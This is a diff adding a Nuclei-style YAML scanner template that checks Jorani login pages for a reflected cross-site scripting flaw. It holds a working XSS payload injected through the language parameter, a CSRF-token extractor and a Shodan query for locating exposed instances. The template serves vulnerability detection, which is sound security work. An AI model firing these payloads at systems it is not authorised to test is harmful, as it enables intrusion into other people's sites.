@@ -1,0 +1,55 @@
+http:
+    - cookie-reuse: true
+      extractors:
+        - group: 1
+          internal: true
+          name: csrf
+          part: body
+          regex:
+            - name="csrf_test_jorani" value="([0-9a-z]+)"
+          type: regex
+      host-redirects: true
+      matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - <script>alert(document.domain)</script>
+            - _jorani
+        - part: header
+          type: word
+          words:
+            - text/html
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /session/login HTTP/1.1
+          Host: {{Hostname}}
+        - |
+          POST /session/login HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          csrf_test_jorani={{csrf}}&last_page=session%2Flogin&language=en-GBarh5l%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3ennois&login={{randstr}}&CipheredValue=
+id: jorani-benjamin-xss
+info:
+    author: ritikchaddha
+    description: |
+        The value of the `language request` parameter is copied into a JavaScript string which is encapsulated in double quotation marks. The payload 75943";alert(1)//569 was submitted in the language parameter. This input was echoed unmodified in the application's response. The attacker can modify the token session and he can discover sensitive information for the server.
+    metadata:
+        max-request: 2
+        shodan-query: http.favicon.hash:-2032163853
+        verified: true
+    name: Jorani v1.0.3-2014-2023 Benjamin BALET - Cross-Site Scripting
+    reference:
+        - https://packetstormsecurity.com/files/174341/Jorani-1.0.3-Cross-Site-Scripting.html
+    severity: medium
+    tags:
+        - packetstorm
+        - jorani
+        - benjamin
+        - storm
+        - Jorani
